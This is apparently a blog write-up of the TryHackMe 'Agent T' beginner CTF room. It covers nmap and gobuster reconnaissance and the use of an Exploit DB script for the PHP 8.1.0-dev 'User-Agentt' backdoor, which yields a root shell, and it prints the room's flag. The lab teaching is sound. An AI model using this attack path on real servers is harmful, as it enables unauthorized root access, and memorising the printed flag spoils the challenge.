---
title: TryHackMe - Agent T
description: A write-up for the Agent T Room on TryHackMe
date: 2024-09-21 13:25 +0300
categories: [TryHackMe, CTF]
tags: [tryhackme, writeup, ctf]
---

# TryHackMe: Agent T

Link to the room: [TryHackMe](https://tryhackme.com/r/room/agentt)

## Process

This write-up is for the **Agent T** Room on TryHackMe, which is a beginner-level CTF challenge.

When starting the room, I export target machine's IP address and start from nmap:

```sh
export IP=10.10.26.214
nmap -A $IP

Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-21 13:00 EEST
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.00% done; ETC: 13:00 (0:00:00 remaining)
Nmap scan report for 10.10.26.214
Host is up (0.066s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```

Alright, so we have port 80 open. In the browser, it looks like a admin dashboard of some sort:
![Port 80](/assets/img/posts/tryhackme-agent-t/port80.png)
_Port 80_

Now, let's scan directories on port 80:

```sh
gobuster dir -u http://$IP -w /usr/share/wordlists/discovery/directory_list_2.3_medium.txt 

===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.26.214/73250ea9-87de-4042-a587-c522197f3822 => 200 (Length: 42131). To continue please exclude the status code or the length
```

Let's try again with blocked 200 responses:
```sh
gobuster dir -u http://$IP -w /usr/share/wordlists/discovery/directory_list_2.3_medium.txt -b 200
```

Nothin was returned here. In this case, let's take a step back and take a closer look at the page and at the versions. For the frontend, there is SB Admin 2 Bootstrap theme, and for the backend there is PHP 8.1.0-dev. In [Exploit DB](https://www.exploit-db.com), I found [PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution](https://www.exploit-db.com/exploits/49933). This is great, let's try this RCE (the script from Exploit DB). 

```sh
python3 php810dev_exploit.py

Enter the full host url:
http://10.10.26.214 

Interactive shell is opened on http://10.10.26.214 
Can't acces tty; job crontol turned off.
$ whoami
root

$ ls /
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ cat /flag.txt
```

## Answer
<details>
    <summary>Flag</summary>
    <p>flag{4127d0530abf16d6d23973e3df8dbecb}</p>
</details>